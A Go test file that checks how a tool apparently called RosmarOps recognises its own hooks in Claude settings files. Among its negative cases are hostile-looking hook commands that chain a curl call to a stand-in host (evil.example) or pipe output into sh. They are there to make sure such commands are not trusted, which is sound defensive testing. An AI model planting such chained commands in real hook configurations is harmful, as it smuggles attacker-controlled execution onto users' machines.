package windows_test

import (
	"os"
	"path/filepath"
	"strconv"
	"testing"

	"github.com/qtorb/rosmarops/adapters/windows"
	"github.com/qtorb/rosmarops/internal/platform"
)

// TestOwnHooks (BV-226 §4, CTO-44 §4d): our session check and status line are
// recognised only with all five conditions; with any one missing they stay
// executables like any other hook.
func TestOwnHooks(t *testing.T) {
	const ours = "/opt/rosmarops/rosmarops"
	prev := windows.OwnBinary
	t.Cleanup(func() { windows.OwnBinary = prev })
	windows.OwnBinary = func(p string) bool { return p == ours || p == `C:\Program Files (x86)\RosmarOps\rosmarops.exe` }

	hook := func(cmd, extra, handlerExtra string) string {
		return `{"hooks":{"SessionStart":[{` + extra + `"hooks":[{"type":"command","command":` + strconv.Quote(cmd) + handlerExtra + `}]}]}}`
	}
	dir := t.TempDir()
	read := func(body, scope string) platform.ClaudeSettingsFile {
		p := filepath.Join(dir, scope+".json")
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		root := ""
		if scope != platform.MCPScopeUser && scope != platform.MCPScopeManaged {
			root = dir
		}
		return windows.ReadClaudeSettings(p, scope, root, dir)
	}
	for _, c := range []struct {
		name, body, scope string
		own               []string
	}{
		{"session check", hook(ours+" session-check", "", ""), platform.MCPScopeUser, []string{platform.OwnHookSessionCheck}},
		{"quoted path with spaces", hook(`"C:\Program Files (x86)\RosmarOps\rosmarops.exe" session-check`, "", ""), platform.MCPScopeUser, []string{platform.OwnHookSessionCheck}},
		{"managed", hook(ours+" session-check", "", ""), platform.MCPScopeManaged, []string{platform.OwnHookSessionCheck}},
		{"status line", `{"statusLine":{"type":"command","command":"` + ours + ` statusline"}}`, platform.MCPScopeUser, []string{platform.OwnHookStatusline}},
		{"in a project", hook(ours+" session-check", "", ""), platform.MCPScopeProject, nil},
		{"in a local file", hook(ours+" session-check", "", ""), platform.MCPScopeLocal, nil},
		{"extra argument", hook(ours+" session-check --x", "", ""), platform.MCPScopeUser, nil},
		{"&& curl", hook(ours+" session-check && curl https://evil.example", "", ""), platform.MCPScopeUser, nil},
		{"pipe", hook(ours+" session-check | sh", "", ""), platform.MCPScopeUser, nil},
		{"variable", hook("$HOME/rosmarops session-check", "", ""), platform.MCPScopeUser, nil},
		{"another fingerprint", hook("/usr/local/bin/rosmarops session-check", "", ""), platform.MCPScopeUser, nil},
		{"matcher", hook(ours+" session-check", `"matcher":"startup",`, ""), platform.MCPScopeUser, nil},
		{"if", hook(ours+" session-check", "", `,"if":"Bash(*)"`), platform.MCPScopeUser, nil},
		{"wrong subcommand", hook(ours+" statusline", "", ""), platform.MCPScopeUser, nil},
		{"other event", `{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"` + ours + ` session-check"}]}]}}`, platform.MCPScopeUser, nil},
	} {
		f := read(c.body, c.scope)
		if !equal(f.OwnHooks, c.own) {
			t.Errorf("%s: own %v, want %v", c.name, f.OwnHooks, c.own)
		}
		if len(c.own) > 0 && len(f.Executables) != 0 {
			t.Errorf("%s: still an executable: %v", c.name, f.Executables)
		}
		if len(c.own) == 0 && len(f.Executables) == 0 {
			t.Errorf("%s: not treated as any other hook (no executable)", c.name)
		}
	}
	if f := read(`{"statusLine":{"type":"command","command":"ccstatusline"}}`, platform.MCPScopeUser); !f.HasStatusLine || len(f.OwnHooks) != 0 {
		t.Errorf("someone else's status line: %+v", f)
	}
	// With no recognition armed, nothing is ours.
	windows.OwnBinary = nil
	if f := read(hook(ours+" session-check", "", ""), platform.MCPScopeUser); len(f.OwnHooks) != 0 {
		t.Errorf("recognised with no reference: %v", f.OwnHooks)
	}
}

func equal(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
